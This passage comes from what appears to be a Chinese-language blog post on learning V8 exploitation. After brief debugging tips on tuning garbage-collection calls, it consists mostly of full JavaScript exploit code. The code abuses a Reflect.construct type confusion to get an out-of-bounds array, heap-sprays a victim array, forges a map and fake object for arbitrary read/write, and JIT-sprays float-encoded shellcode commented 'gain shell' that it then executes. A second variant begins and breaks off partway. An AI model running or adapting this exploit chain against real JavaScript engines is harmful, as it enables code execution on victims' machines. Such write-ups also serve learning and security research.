class="line">hexx(&#x27;lenth&#x27;,oob_array.length)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208204255697.png" alt="image-20251208204255697"></p>
<p>可以看到lenth很大符合我们的要求，通常代码结构不变时lenth处的残留数据值也不变</p>
<p>然后说一下调试时会遇到的问题，写exp调试时可能会加各种输出，这大概率会导致原本的lenth变成很小，或者程序崩溃</p>
<p>这种情况的解决办法就是增多或减少gc()数量，根据笔者调试的经验gc()的数量一般在2-5之间，这种问题目前遇到的debug输出或者改变代码结构，哪怕一行都会出现，所以调试时每次代码结构改变都得重新设置gc()数量</p>
<h5 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h5><p>笔者当时的想法是直接oob读出map类型混淆，实测时发现如果oob的读一些地址会直接崩溃掉，可能是地址不稳定造成的？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">let float_arr = [1.1,2.2,3.3];</span><br><span class="line">let obj = &#123;&#125;;</span><br><span class="line">let obj_arr = [obj];</span><br><span class="line">p(oob_array);</span><br><span class="line">p(obj_arr);</span><br><span class="line">p(float_arr);</span><br><span class="line">console.log(oob_array.length);</span><br><span class="line">var confused_element_addr = 0x219 - 1 + 8;</span><br><span class="line">let map = i2lo(oob_array[(0x25f1c8 - confused_element_addr)/8]);</span><br><span class="line">console.log(hex(map));</span><br></pre></td></tr></table></figure>

<p>下面参考了flyyyy师傅的方法利用Heap Spary在堆上喷一个victim_array，因为Heap Spary victim_array相对oob_array的地址比较稳定</p>
<p>然后就去伪造一个map以及fakeobject进行任意地址读写，最后JIT Spary执行shellcode 不过实际测试下来因为Heap Spary所以map的地址也基本稳定，所以可以不伪造map也行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">//p(oob_array);</span><br><span class="line">hexx(&#x27;lenth&#x27;,oob_array.length)</span><br><span class="line">let oob_element_addr = 0x219 - 1 + 8;</span><br><span class="line"></span><br><span class="line">let element_addr = 0x2c2129 - 1;</span><br><span class="line">let element_addr_start = element_addr + 8;</span><br><span class="line">let fake_map_addr = element_addr + 0x1000;</span><br><span class="line">let fake_object_addr = element_addr + 0x2000;</span><br><span class="line">let saved_fake_object_addr = element_addr + 0x100;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//printhex(oob_element_addr);</span><br><span class="line">//printhex(element_addr);</span><br><span class="line">//printhex(element_addr_start);</span><br><span class="line">//printhex(fake_map_addr);</span><br><span class="line">//printhex(fake_object_addr);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">let victim_array = new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">//p(victim_array);</span><br><span class="line">//let float_arr = [1.1,2.2,3.3];</span><br><span class="line">//p(float_arr);</span><br><span class="line">//stop();</span><br><span class="line"></span><br><span class="line">oob_array[(fake_map_addr - oob_element_addr)/8] = i2f(0x2c04040400000061n);</span><br><span class="line">oob_array[(fake_map_addr - oob_element_addr)/8 + 1] = i2f(0x0a0007ff11000842n);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8] = i2f64(fake_map_addr+1,0x0);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(0x1000,0x1000);</span><br><span class="line">oob_array[(saved_fake_object_addr - oob_element_addr)/8] = i2f64(fake_object_addr+1,fake_object_addr+1);</span><br><span class="line"></span><br><span class="line">var fake_object = victim_array[(saved_fake_object_addr - element_addr_start)/4];</span><br><span class="line"></span><br><span class="line">// p(fake_object);</span><br><span class="line"> </span><br><span class="line">function addressOf(obj)&#123;</span><br><span class="line">    victim_array[0] = obj;</span><br><span class="line">    return i2lo(f2i(oob_array[(element_addr_start - oob_element_addr)/8]));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//p(shellcode);</span><br><span class="line"> </span><br><span class="line">var shellcode_addr = addressOf(shellcode);</span><br><span class="line">hexx(&#x27;shellcode_addr&#x27;,shellcode_addr);</span><br><span class="line"> </span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(shellcode_addr - 8 + 0x18,0x1000);</span><br><span class="line"> </span><br><span class="line">var code_addr = i2lo(f2i(fake_object[0]));</span><br><span class="line">hexx(&#x27;code_addr&#x27;,code_addr);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(code_addr - 8 + 0x10,0x1000);</span><br><span class="line">var ins_base = (f2i(fake_object[0]));</span><br><span class="line"> </span><br><span class="line">var rop_addr = ins_base + 0x82n;</span><br><span class="line">fake_object[0] = i2f(rop_addr);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//stop();</span><br><span class="line">shellcode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210311870.png" alt="image-20251208210311870"></p>
<p>下面不伪造map也可以getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] 